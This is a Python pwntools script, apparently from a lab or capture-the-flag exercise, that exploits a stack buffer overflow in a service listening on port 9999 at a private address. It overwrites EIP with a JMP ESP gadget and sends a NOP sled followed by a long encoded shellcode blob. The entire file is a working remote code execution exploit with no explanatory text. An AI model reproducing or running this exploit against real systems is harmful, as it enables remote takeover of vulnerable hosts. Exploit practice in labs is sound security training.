from pwn import * 

ip = "192.168.15.172"
port = 9999 

cmd = "shitstorm " #not necessary
offset_to_eip = 524 #pwn cyclic -l 66616167
offset_to_esp = 528 #pwn cyclic -l haaf eip as cafebabe to test
new_eip =  0x311712f3 #!mona jmp -r esp 0x311712f3

shellcode =  b"\x90"*9
shellcode += b"\xbe\x0d\xe7\x2d\xe6\xd9\xcd\xd9\x74\x24\xf4"
shellcode += b"\x58\x31\xc9\xb1\x52\x31\x70\x12\x03\x70\x12"
shellcode += b"\x83\xcd\xe3\xcf\x13\x31\x03\x8d\xdc\xc9\xd4"
shellcode += b"\xf2\x55\x2c\xe5\x32\x01\x25\x56\x83\x41\x6b"
shellcode += b"\x5b\x68\x07\x9f\xe8\x1c\x80\x90\x59\xaa\xf6"
shellcode += b"\x9f\x5a\x87\xcb\xbe\xd8\xda\x1f\x60\xe0\x14"
shellcode += b"\x52\x61\x25\x48\x9f\x33\xfe\x06\x32\xa3\x8b"
shellcode += b"\x53\x8f\x48\xc7\x72\x97\xad\x90\x75\xb6\x60"
shellcode += b"\xaa\x2f\x18\x83\x7f\x44\x11\x9b\x9c\x61\xeb"
shellcode += b"\x10\x56\x1d\xea\xf0\xa6\xde\x41\x3d\x07\x2d"
shellcode += b"\x9b\x7a\xa0\xce\xee\x72\xd2\x73\xe9\x41\xa8"
shellcode += b"\xaf\x7c\x51\x0a\x3b\x26\xbd\xaa\xe8\xb1\x36"
shellcode += b"\xa0\x45\xb5\x10\xa5\x58\x1a\x2b\xd1\xd1\x9d"
shellcode += b"\xfb\x53\xa1\xb9\xdf\x38\x71\xa3\x46\xe5\xd4"
shellcode += b"\xdc\x98\x46\x88\x78\xd3\x6b\xdd\xf0\xbe\xe3"
shellcode += b"\x12\x39\x40\xf4\x3c\x4a\x33\xc6\xe3\xe0\xdb"
shellcode += b"\x6a\x6b\x2f\x1c\x8c\x46\x97\xb2\x73\x69\xe8"
shellcode += b"\x9b\xb7\x3d\xb8\xb3\x1e\x3e\x53\x43\x9e\xeb"
shellcode += b"\xf4\x13\x30\x44\xb5\xc3\xf0\x34\x5d\x09\xff"
shellcode += b"\x6b\x7d\x32\xd5\x03\x14\xc9\xbe\xeb\x41\xde"
shellcode += b"\x6b\x84\x93\xe0\x82\x08\x1d\x06\xce\xa0\x4b"
shellcode += b"\x91\x67\x58\xd6\x69\x19\xa5\xcc\x14\x19\x2d"
shellcode += b"\xe3\xe9\xd4\xc6\x8e\xf9\x81\x26\xc5\xa3\x04"
shellcode += b"\x38\xf3\xcb\xcb\xab\x98\x0b\x85\xd7\x36\x5c"
shellcode += b"\xc2\x26\x4f\x08\xfe\x11\xf9\x2e\x03\xc7\xc2"
shellcode += b"\xea\xd8\x34\xcc\xf3\xad\x01\xea\xe3\x6b\x89"
shellcode += b"\xb6\x57\x24\xdc\x60\x01\x82\xb6\xc2\xfb\x5c"
shellcode += b"\x64\x8d\x6b\x18\x46\x0e\xed\x25\x83\xf8\x11"
shellcode += b"\x97\x7a\xbd\x2e\x18\xeb\x49\x57\x44\x8b\xb6"
shellcode += b"\x82\xcc\xab\x54\x06\x39\x44\xc1\xc3\x80\x09"
shellcode += b"\xf2\x3e\xc6\x37\x71\xca\xb7\xc3\x69\xbf\xb2"
shellcode += b"\x88\x2d\x2c\xcf\x81\xdb\x52\x7c\xa1\xc9"


payload = fit({
	0:cmd,
	offset_to_eip:new_eip,
	offset_to_esp:shellcode,
	}, length=2000)

conn = remote(ip,port)
conn.readline()
conn.sendline(payload)
